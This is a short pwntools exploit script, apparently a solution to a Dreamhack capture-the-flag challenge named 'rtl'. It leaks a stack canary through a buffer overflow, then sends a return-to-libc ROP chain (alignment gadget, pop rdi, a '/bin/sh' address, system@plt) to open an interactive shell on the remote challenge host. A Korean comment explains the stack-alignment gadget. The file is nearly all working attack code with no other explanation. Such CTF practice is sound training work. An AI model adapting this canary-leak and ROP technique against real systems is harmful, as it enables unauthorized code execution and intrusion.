from pwn import *

p = remote('host3.dreamhack.games', 21186)
e = ELF('./rtl')

def slog(name, addr):
    return success(': '.join([name, hex(addr)]))

# find canary and print

buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)

canary = u64(b'\x00' + p.recvn(7))
slog('canary', canary)

# exploit

system_plt = e.plt['system']
binsh = 0x400874
pop_rdi = 0x400853
ret = 0x400285

payload = b'A' * 0x38
payload += p64(canary)
payload += b'B' * 0x08
payload += p64(ret) # system 함수로 이동할 때 스택은 16바이트 단위로 정렬되어있어야 해서 넣어주는 코드

payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

p.sendafter(b"Buf: ", payload)

p.interactive()
